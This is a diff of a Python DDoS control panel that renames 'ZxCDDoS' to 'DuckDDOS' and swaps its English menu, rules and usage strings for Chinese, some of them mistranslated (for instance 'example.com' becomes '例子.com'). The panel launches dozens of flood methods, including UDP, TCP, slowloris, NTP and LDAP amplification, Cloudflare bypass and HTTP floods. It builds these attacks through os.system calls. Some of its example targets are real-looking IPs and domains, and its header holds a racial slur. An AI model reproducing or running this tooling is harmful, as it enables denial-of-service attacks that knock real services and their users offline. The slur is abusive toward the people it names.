@@ -1,5 +1,5 @@
 ##############################
-# ZxCDDoS Made by zxcr9999   #
+# DuckDDOS 由制成 wolfxsec   #
 # COPY = NIGGER              #
 ##############################
 
@@ -124,11 +124,11 @@ def rules():
                                 \x1b[38;2;0;212;14m╔═══════════════╗
                                 \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. 请勿攻击 .gov/.gob/.edu/.mil 域名           \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. 只攻击压测服务器                            \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. 不要让面板打滑                              \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. 给github仓库一个star                       \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. 创作者并没有造成任何伤害          \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
 ''')
 
@@ -222,7 +222,7 @@ def menu():
                         \x1b[38;2;0;212;14m╔═╝ \x1b[38;2;0;186;45m ╔╩╦╝  ║ \x1b[38;2;0;150;88m    ║║ \x1b[38;2;0;113;133m  ║║ \x1b[38;2;0;83;168m ║ ║ \x1b[38;2;0;49;147m ╚═╗
                         \x1b[38;2;0;212;14m╚═╝ \x1b[38;2;0;186;45m ╩ ╚═  ╚═\x1b[38;2;0;150;88m╝  ═╩╝ \x1b[38;2;0;113;133m ═╩╝ \x1b[38;2;0;83;168m ╚═╝ \x1b[38;2;0;49;147m ╚═╝
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
-                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to ZxC C2 DDoS Panel        \x1b[38;2;0;49;147m║
+                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239m欢迎来到 Duck DDoS 面板        \x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel 2022\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                     \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
@@ -265,8 +265,8 @@ def main():
                 port = cnc.split()[2]
                 os.system(f'./UDPBYPASS {ip} {port}')
             except IndexError:
-                print('Usage: udpbypass <ip> <port>')
-                print('Example: udpbypass 1.1.1.1 80')
+                print('用法: udpbypass <ip> <port>')
+                print('例子: udpbypass 1.1.1.1 80')
 
         elif "stdv2" in cnc:
             try:
@@ -274,8 +274,8 @@ def main():
                 port = cnc.split()[2]
                 os.system(f'./std {ip} {port}')
             except IndexError:
-                print('Usage: stdv2 <ip> <port>')
-                print('Example: stdv2 1.1.1.1 80')
+                print('用法: stdv2 <ip> <port>')
+                print('例子: stdv2 1.1.1.1 80')
 
         elif "flux" in cnc:
             try:
@@ -284,8 +284,8 @@ def main():
                 thread = cnc.split()[3]
                 os.system(f'./flux {ip} {port} {thread} 0')
             except IndexError:
-                print('Usage: flux <ip> <port> <threads>')
-                print('Example: flux 1.1.1.1 80 250')
+                print('用法: flux <ip> <port> <threads>')
+                print('例子: flux 1.1.1.1 80 250')
 
         elif "slowloris" in cnc:
             try:
@@ -293,8 +293,8 @@ def main():
                 port = cnc.split()[2]
                 os.system(f'./slowloris {ip} {port}')
             except IndexError:
-                print('Usage: slowloris <ip> <port>')
-                print('Example: slowloris 1.1.1.1 80')
+                print('用法: slowloris <ip> <port>')
+                print('例子: slowloris 1.1.1.1 80')
 
         elif "god" in cnc:
             try:
@@ -303,8 +303,8 @@ def main():
                 time = cnc.split()[3]
                 os.system(f'perl god.pl {ip} {port} 65500 {time}')
             except IndexError:
-                print('Usage: god <ip> <port> <time>')
-                print('Example: god 1.1.1.1 80 60')
+                print('用法: god <ip> <port> <time>')
+                print('例子: god 1.1.1.1 80 60')
 
         elif "destroy" in cnc:
             try:
@@ -313,8 +313,8 @@ def main():
                 time = cnc.split()[3]
                 os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
             except IndexError:
-                print('Usage: destroy <ip> <port> <time>')
-                print('Example: destroy 1.1.1.1 80 60')
+                print('用法: destroy <ip> <port> <time>')
+                print('例子: destroy 1.1.1.1 80 60')
 
         elif "std" in cnc:
             try:
@@ -322,8 +322,8 @@ def main():
                 port = cnc.split()[2]
                 os.system(f'./STD-NOSPOOF {ip} {port}')
             except IndexError:
-                print('Usage: std <ip> <port>')
-                print('Example: std 1.1.1.1 80')
+                print('用法: std <ip> <port>')
+                print('例子: std 1.1.1.1 80')
 
         elif "home" in cnc:
             try:
@@ -333,8 +333,8 @@ def main():
                 time = cnc.split()[4]
                 os.system(f'perl home.pl {ip} {port} {psize} {time}')
             except IndexError:
-                print('Usage: home <ip> <port> <packet_size> <time>')
-                print('Example: home 1.1.1.1 80 65500 60')
+                print('用法: home <ip> <port> <packet_size> <time>')
+                print('例子: home 1.1.1.1 80 65500 60')
 
         elif "udp" in cnc:
             try:
@@ -342,8 +342,8 @@ def main():
                 port = cnc.split()[2]
                 os.system(f'python2 udp.py {ip} {port} 0 0')
             except IndexError:
-                print('Usage: udp <ip> <port>')
-                print('Example: udp 1.1.1.1 80')
+                print('用法: udp <ip> <port>')
+                print('例子: udp 1.1.1.1 80')
 
         elif "nfo-killer" in cnc:
             try:
@@ -353,8 +353,8 @@ def main():
                 time = cnc.split()[4]
                 os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
             except IndexError:
-                print('Usage: nfo-killer <ip> <port> <threads> <time>')
-                print('Example: nfo-killer 1.1.1.1 80 850 60')
+                print('用法: nfo-killer <ip> <port> <threads> <time>')
+                print('例子: nfo-killer 1.1.1.1 80 850 60')
 
         elif "ovh-raw" in cnc:
             try:
@@ -365,8 +365,8 @@ def main():
                 conns = cnc.split()[5]
                 os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
             except IndexError:
-                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
-                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')
+                print('用法: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('例子: ovh-raw GET 1.1.1.1 80 60 8500')
 
         elif "tcp" in cnc:
             try:
@@ -377,10 +377,10 @@ def main():
                 conns = cnc.split()[5]
                 os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
             except IndexError:
-                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
-                print('Example: tcp GET 1.1.1.1 80 60 8500')
+                print('用法: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('例子: tcp GET 1.1.1.1 80 60 8500')
 
-# SPECIAL METHODS
+# 特殊方法
 
         elif "stress" in cnc:
             try:
@@ -392,13 +392,13 @@ def main():
                 out = cnc.split()[6]
                 os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
             except IndexError:
-                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
+                print('用法: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                 print('MODE: [1] TCP')
                 print('      [2] UDP')
                 print('      [3] HTTP')
-                print('Example: stress 1.1.1.1 80 3 1250 60 5')
+                print('例子: stress 1.1.1.1 80 3 1250 60 5')
                 
-# AMP/GAMES METHODS
+# AMP/游戏方法
 
         elif "samp" in cnc:
             try:
@@ -406,8 +406,8 @@ def main():
                 port = cnc.split()[2]
                 os.system(f'python2 samp.py {ip} {port}')
             except IndexError:
-                print('Usage: samp <ip> <port>')
-                print('Example: samp 1.1.1.1 7777')
+                print('用法: samp <ip> <port>')
+                print('例子: samp 1.1.1.1 7777')
 
         elif "ldap" in cnc:
             try:
@@ -417,8 +417,8 @@ def main():
                 time = cnc.split()[4]
                 os.system(f'./ldap {ip} {port} {thread} -1 {time}')
             except IndexError:
-                print('Usage: ldap <ip> <port> <threads> <time>')
-                print('Example: ldap 1.1.1.1 80 650 60')
+                print('用法: ldap <ip> <port> <threads> <time>')
+                print('例子: ldap 1.1.1.1 80 650 60')
 
         elif "minecraft" in cnc:
             try:
@@ -428,8 +428,8 @@ def main():
                 time = cnc.split()[4]
                 os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
             except IndexError:
-                print('Usage: minecraft <ip> <throttle> <threads> <time>')
-                print('Example: minecraft 1.1.1.1 5000 500 60')
+                print('用法: minecraft <ip> <throttle> <threads> <time>')
+                print('例子: minecraft 1.1.1.1 5000 500 60')
 
         elif "ovh-amp" in cnc:
             try:
@@ -437,8 +437,8 @@ def main():
                 port = cnc.split()[2]
                 os.system(f'./OVH-AMP {ip} {port}')
             except IndexError:
-                print('Usage: ovh-amp <ip> <port>')
-                print('Example: ovh-amp 1.1.1.1 80')
+                print('用法: ovh-amp <ip> <port>')
+                print('例子: ovh-amp 1.1.1.1 80')
                 
         elif "ntp" in cnc:
             try:
@@ -448,8 +448,8 @@ def main():
                 time = cnc.split()[4]
                 os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
             except IndexError:
-                print('Usage: ntp <ip> <port> <throttle> <time>')
-                print('Example: ntp 1.1.1.1 22 250 60')
+                print('用法: ntp <ip> <port> <throttle> <time>')
+                print('例子: ntp 1.1.1.1 22 250 60')
 
 # LAYER 7 METHODS
  
@@ -461,8 +461,8 @@ def main():
                 time = cnc.split()[4] 
                 os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
             except IndexError:
-                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
-                print('Example: ovh-beam GET 51.38.92.223 80 60')
+                print('用法: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
+                print('例子: ovh-beam GET 51.38.92.223 80 60')
     
         elif "https-spoof" in cnc:
             try:
@@ -471,8 +471,8 @@ def main():
                 thread = cnc.split()[3]
                 os.system(f'python3 https-spoof.py {url} {time} {thread}')
             except IndexError:
-                print('Usage: https-spoof <url> <time> <threads>')
-                print('Example: https-spoof http://vailon.com 60 500')
+                print('用法: https-spoof <url> <time> <threads>')
+                print('例子: https-spoof http://vailon.com 60 500')
     
         elif "slow" in cnc:
             try:
@@ -480,8 +480,8 @@ def main():
                 time = cnc.split()[2]
                 os.system(f'node slow.js {url} {time}')
             except IndexError:
-                print('Usage: slow <url> <time>')
-                print('Example: slow http://vailon.com 60')
+                print('用法: slow <url> <time>')
+                print('例子: slow http://vailon.com 60')
     
         elif "hyper" in cnc:
             try:
@@ -489,8 +489,8 @@ def main():
                 time = cnc.split()[2]
                 os.system(f'node hyper.js {url} {time}')
             except IndexError:
-                print('Usage: hyper <url> <time>')
-                print('Example: hyper http://vailon.com 60')
+                print('用法: hyper <url> <time>')
+                print('例子: hyper http://vailon.com 60')
                 
         elif "cf-socket" in cnc:
             try:
@@ -516,8 +516,8 @@ def main():
                 time = cnc.split()[3]
                 os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
-                print('Usage: http-socket <url> <per> <time>')
-                print('Example: http-socket http://example.com 5000 60')
+                print('用法: http-socket <url> <per> <time>')
+                print('例子: http-socket http://例子.com 5000 60')
 
         elif "http-raw" in cnc:
             try:
@@ -525,8 +525,8 @@ def main():
                 time = cnc.split()[2]
                 os.system(f'node HTTP-RAW {url} {time}')
             except IndexError:
-                print('Usage: http-raw <url> <time>')
-                print('Example: http-raw http://example.com 60')
+                print('用法: http-raw <url> <time>')
+                print('例子: http-raw http://例子.com 60')
 
         elif "http-requests" in cnc:
             try:
@@ -534,8 +534,8 @@ def main():
                 time = cnc.split()[2]
                 os.system(f'node HTTP-REQUESTS {url} {time}')
             except IndexError:
-                print('Usage: http-requests <url> <time>')
-                print('Example: http-requests http://example.org 60')
+                print('用法: http-requests <url> <time>')
+                print('例子: http-requests http://例子.org 60')
 
         elif "http-rand" in cnc:
             try:
@@ -543,8 +543,8 @@ def main():
                 time = cnc.split()[2]
                 os.system(f'node HTTP-RAND.js {url} {time}')
             except IndexError:
-                print('Usage: http-rand <url> <time>')
-                print('Example: http-rand http://vailon.com/ 60')
+                print('用法: http-rand <url> <time>')
+                print('例子: http-rand http://vailon.com/ 60')
 
         elif "overflow" in cnc:
             try:
@@ -553,8 +553,8 @@ def main():
                 thread = cnc.split()[3]
                 os.system(f'./OVERFLOW {ip} {port} {thread}')
             except IndexError:
-                print('Usage: overflow <ip> <port> <threads>')
-                print('Example: overflow 1.1.1.1 80 5000')
+                print('用法: overflow <ip> <port> <threads>')
+                print('例子: overflow 1.1.1.1 80 5000')
 
         elif "cf-bypass" in cnc:
             try:
@@ -563,8 +563,8 @@ def main():
                 thread = cnc.split()[3]
                 os.system(f'node cf.js {url} {time} {thread}')
             except IndexError:
-                print('Usage: cf-bypass <url> <time> <threads>')
-                print('Example: cf-bypass http://example.com 60 1250')
+                print('用法: cf-bypass <url> <time> <threads>')
+                print('例子: cf-bypass http://例子.com 60 1250')
 
         elif "uambypass" in cnc:
             try:
@@ -573,8 +573,8 @@ def main():
                 per = cnc.split()[3]
                 os.system(f'node uambypass.js {url} {time} {per} http.txt')
             except IndexError:
-                print('Usage: uambypass <url> <time> <req_per_ip>')
-                print('Example: uambypass http://example.com 60 1250')
+                print('用法: uambypass <url> <time> <req_per_ip>')
+                print('例子: uambypass http://例子.com 60 1250')
 
         elif "crash" in cnc:
             try:
@@ -582,8 +582,8 @@ def main():
                 method = cnc.split()[2]
                 os.system(f'go run Hulk.go -site {url} -data {method}')
             except IndexError:
-                print('Usage: crash <url> METHODS<GET/POST>')
-                print('Example: crash http://example.com GET')
+                print('用法: crash <url> METHODS<GET/POST>')
+                print('例子: crash http://例子.com GET')
 
         elif "httpflood" in cnc:
             try:
@@ -593,16 +593,16 @@ def main():
                 time = cnc.split()[4]
                 os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
             except IndexError:
-                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
-                print('Example: httpflood http://example.com 15000 get 60')
+                print('用法: httpflood <url> <threads> METHODS<GET/POST> <time>')
+                print('例子: httpflood http://例子.com 15000 get 60')
 
         elif "httpget" in cnc:
             try:
                 url = cnc.split()[1]
                 os.system(f'./httpget {url} 10000 50 100')
             except IndexError:
-                print('Usage: httpget <url>')
-                print('Example: httpget http://example.com')
+                print('用法: httpget <url>')
+                print('例子: httpget http://例子.com')
 
 # BANNERS
 
@@ -665,8 +665,8 @@ def main():
                 except:
                     print("[ API Error :( ]")
             except IndexError:
-                print('Usage: geoip <ip>')
-                print('Example: geoip 1.1.1.1')
+                print('用法: geoip <ip>')
+                print('例子: geoip 1.1.1.1')
 
         elif "reverseip" in cnc:
             try:
@@ -677,8 +677,8 @@ def main():
                 except:
                     print("[ API Error :( ]")
             except IndexError:
-                print('Usage: reverseip <ip>')
-                print('Example: reverseip 1.1.1.1')
+                print('用法: reverseip <ip>')
+                print('例子: reverseip 1.1.1.1')
 
         elif "subnet-lookup" in cnc:
             try:
@@ -689,8 +689,8 @@ def main():
                 except:
                     print("[ API Error :( ]")
             except IndexError:
-                print('Usage: subnet-lookup <cdr/ip + netmask>')
-                print('Example: subnet-lookup 192.168.1.0/24')
+                print('用法: subnet-lookup <cdr/ip + netmask>')
+                print('例子: subnet-lookup 192.168.1.0/24')
 
         elif "asn-lookup" in cnc:
             try:
@@ -701,8 +701,8 @@ def main():
                 except:
                     print("[ API Error :( ]")
             except IndexError:
-                print('Usage: asn-lookup <ip/asn>')
-                print('Example: asn-lookup AS15169')
+                print('用法: asn-lookup <ip/asn>')
+                print('例子: asn-lookup AS15169')
 
         elif "dns-lookup" in cnc:
             try:
@@ -713,8 +713,8 @@ def main():
                 except:
                     print("[ API Error :( ]")
             except IndexError:
-                print('Usage: dns-lookup <dns>')
-                print('Example: dns-lookup google.com')
+                print('用法: dns-lookup <dns>')
+                print('例子: dns-lookup google.com')
 
         elif "reverse-dns" in cnc:
             try:
@@ -725,8 +725,8 @@ def main():
                 except:
                     print("[ API Error :( ]")
             except IndexError:
-                print('Usage: reverse-dns <ip/domain>')
-                print('Example: reverse-dns 8.8.8.8')                
+                print('用法: reverse-dns <ip/domain>')
+                print('例子: reverse-dns 8.8.8.8')                
 
         elif "cloudflare-lag" in cnc:
             print('Method "CLOUDFLARE-LAG" not enabled')
